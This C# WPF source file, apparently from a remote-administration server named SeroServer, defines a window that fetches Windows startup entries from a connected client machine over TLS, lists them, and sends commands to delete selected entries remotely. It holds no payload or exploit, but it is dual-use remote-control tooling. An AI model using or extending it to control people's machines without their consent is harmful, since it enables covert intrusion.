using System.Collections.ObjectModel;
using System.Windows;
using System.Windows.Input;
using DevExpress.Xpf.Core;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class StartupManagerWindow : ThemedWindow
{
    private readonly TlsServer _server;
    private readonly string    _clientId;
    private readonly ObservableCollection<StartupEntryVM> _entries = [];
    private CancellationTokenSource? _refreshCts;
    private bool _awaitingResponse;
    private bool _disconnected;

    public StartupManagerWindow(TlsServer server, string clientId, string clientLabel)
    {
        InitializeComponent();
        RubberBandSelector.Enable(GridStartup);
        TypeToSelect.Enable(GridStartup, o => (o as StartupEntryVM)?.Name ?? "");
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text = clientLabel;
        GridStartup.ItemsSource = _entries;

        _server.RegisterHandler(clientId, PacketType.StartupListResult, OnList);
        _server.ClientDisconnected += OnClientDisconnected;
        Lang.LanguageChanged += ApplyLanguage;
        ApplyLanguage();
        Closed += (_, _) =>
        {
            _server.UnregisterHandler(clientId, PacketType.StartupListResult);
            _server.ClientDisconnected -= OnClientDisconnected;
            Lang.LanguageChanged -= ApplyLanguage;
            _refreshCts?.Cancel(); _refreshCts?.Dispose(); _refreshCts = null;
        };
        Loaded += async (_, _) => { await Task.Delay(Random.Shared.Next(0, 250)); await Refresh(); };
    }

    private void ApplyLanguage()
    {
        Title = Lang.Get("FEAT_STARTUP_MGR");
        if (MnuStupDelete   != null) MnuStupDelete.Header   = Lang.Get("ACT_DELETE_ENTRY");
        if (MnuStupCopyName != null) MnuStupCopyName.Header = Lang.Get("ACT_COPY_NAME");
        if (MnuStupCopyPath != null) MnuStupCopyPath.Header = Lang.Get("ACT_COPY_PATH");
        if (MnuStupRefresh  != null) MnuStupRefresh.Header  = Lang.Get("ACT_REFRESH");
        if (ColStupName      != null) ColStupName.Header      = Lang.Get("WIN_COL_NAME");
        if (ColStupType      != null) ColStupType.Header      = Lang.Get("WIN_COL_TYPE");
        if (ColStupLocation  != null) ColStupLocation.Header  = Lang.Get("WIN_COL_LOCATION");
        if (ColStupPublisher != null) ColStupPublisher.Header = Lang.Get("WIN_COL_PUBLISHER");
        if (ColStupPath      != null) ColStupPath.Header      = Lang.Get("WIN_COL_PATH");
    }

    private async Task Refresh()
    {
        if (_disconnected) return;
        BtnRefresh.IsEnabled = false;
        _refreshCts?.Cancel();
        _refreshCts?.Dispose();
        _refreshCts = new CancellationTokenSource();
        var cts = _refreshCts;
        _awaitingResponse = true;
        TxtStatus.Text = Lang.Get("STATUS_REFRESHING");
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.StartupGetList });
        try
        {
            await Task.Delay(14000, cts.Token);
            // 14 s elapsed without a response — update status
            _ = Dispatcher.BeginInvoke(() =>
            {
                BtnRefresh.IsEnabled = true;
                if (_awaitingResponse)
                    TxtStatus.Text = Lang.Get("ERR_NO_RESPONSE");
            });
        }
        catch (TaskCanceledException) { /* OnList arrived, timeout cancelled */ }
    }

    private void OnList(Packet pkt)
    {
        try
        {
            var data = JsonConvert.DeserializeObject<StartupListResultData>(pkt.Data);
            if (data == null) return;
            Dispatcher.BeginInvoke(() =>
            {
                _entries.Clear();
                foreach (var e in data.Entries)
                {
                    // Skip COM-class activation stubs — schtasks "Task to Run" shows a localized
                    // string like "COM handler" instead of a real path. Only applies to Task/WMI
                    // sources; Reg/File sources always have a real path and must never be skipped.
                    bool isComTask = e.Type != "Reg" && e.Type != "File"
                                  && !e.Path.Contains('\\') && !e.Path.Contains('/')
                                  && !e.Path.Contains(':') && !e.Path.StartsWith("%");
                    if (isComTask) continue;
                    _entries.Add(new StartupEntryVM(e.Name, e.Type, e.Location, e.Path, e.Verified, e.Publisher));
                }
                _awaitingResponse = false;
                _refreshCts?.Cancel();
                TxtCount.Text  = $"({_entries.Count})";
                TxtStatus.Text = string.Format(Lang.Get("STUP_UPDATED"), DateTime.Now.ToString("HH:mm:ss"), _entries.Count);
                BtnRefresh.IsEnabled = true;
            });
        }
        catch { }
    }

    private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
    {
        if (c.Id != _clientId) return;
        _refreshCts?.Cancel();
        Dispatcher.BeginInvoke(() =>
        {
            _disconnected      = true;
            _awaitingResponse  = false;
            TxtStatus.Text     = Lang.Get("PM_DISCONNECTED");
            GridStartup.Opacity = 0.55;
        });
    }

    private async void Refresh_Click(object s, RoutedEventArgs e)
    {
        BtnRefresh.IsEnabled = false;
        await Refresh();
    }

    private async void Delete_Click(object s, RoutedEventArgs e)
    {
        var selected = GridStartup.SelectedItems.Cast<StartupEntryVM>().ToList();
        if (selected.Count == 0) return;
        string msg = selected.Count == 1
            ? string.Format(Lang.Get("STUP_CONFIRM_1"), selected[0].Name)
            : string.Format(Lang.Get("STUP_CONFIRM_N"), selected.Count);
        if (MessageBox.Show(msg, Lang.Get("MSG_CONFIRM"), MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;

        foreach (var row in selected)
        {
            var data = JsonConvert.SerializeObject(new StartupDeleteData { Name = row.Name, Type = row.Type, Location = row.Location });
            await _server.SendToClient(_clientId, new Packet { Type = PacketType.StartupDelete, Data = data });
            await Task.Delay(80);
        }
        ServerWindow.ReportGlobalActivity("Delete startup", selected.Count == 1 ? selected[0].Name : $"{selected.Count} items", "complete");
        ServerWindow.LogGlobal($"[STARTUP] Deleted startup entry {(selected.Count == 1 ? $"'{selected[0].Name}'" : $"{selected.Count} entries")} on client {_clientId}.");
        await Task.Delay(400);
        await Refresh();
    }

    private void GridStartup_CopyName_Click(object s, RoutedEventArgs e)
    {
        if (GridStartup.SelectedItem is StartupEntryVM vm)
            try { System.Windows.Clipboard.SetText(vm.Name); TxtStatus.Text = string.Format(Lang.Get("COPIED"), vm.Name); } catch { }
    }

    private void GridStartup_CopyPath_Click(object s, RoutedEventArgs e)
    {
        if (GridStartup.SelectedItem is StartupEntryVM vm)
            try { System.Windows.Clipboard.SetText(vm.Path); TxtStatus.Text = string.Format(Lang.Get("COPIED"), vm.Path); } catch { }
    }

    private void Close_Click(object s, RoutedEventArgs e) => Close();

    private void GridStartup_ContextMenuOpening(object sender, System.Windows.Controls.ContextMenuEventArgs e)
    {
        if (GridStartup.SelectedItems.Count == 0) e.Handled = true;
    }
}

public class StartupEntryVM
{
    public string Name      { get; }
    public string Type      { get; }
    public string Location  { get; }
    public string Path      { get; }
    public bool   Verified  { get; }
    public string Publisher { get; }

    public StartupEntryVM(string name, string type, string location, string path, bool verified, string publisher)
    {
        Name = name; Type = type; Location = location; Path = path; Verified = verified; Publisher = publisher;
    }

    public string PublisherDisplay
    {
        get
        {
            var prefix = Verified ? "✓" : "✗";
            return string.IsNullOrEmpty(Publisher) ? prefix : $"{prefix} {Publisher}";
        }
    }
}
